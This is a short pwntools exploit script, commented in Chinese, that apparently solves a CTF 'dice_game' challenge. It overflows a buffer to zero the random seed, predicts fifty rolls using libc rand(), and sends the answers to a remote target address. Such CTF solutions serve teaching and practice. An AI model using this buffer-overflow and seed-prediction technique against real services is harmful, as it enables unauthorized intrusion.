# -*- coding: utf-8 -*-

from pwn import *
from ctypes import *#在python里面使用这个库来使用c/c++编写的动态链接库

local = 0
if local:         #if else 使用选择本地或者远程
	p = process('./dice_game')
else:
	p = remote("111.198.29.45", 47332)
	
p.recv()#重要的recv()要先接收
payload=0x40*"a"+p64(0)
p.sendline(payload)
libc = CDLL("libc.so.6")#确定库的名称
a=""
for i in range(50):#这里利用的是srand()调用相同的随机种子seed[0],生成的随机序列相同的原理
	a=a+str(libc.rand()%6+1)
print(a)
for i in range(50):
	p.recv()
	p.sendline(a[i])
p.interactive()
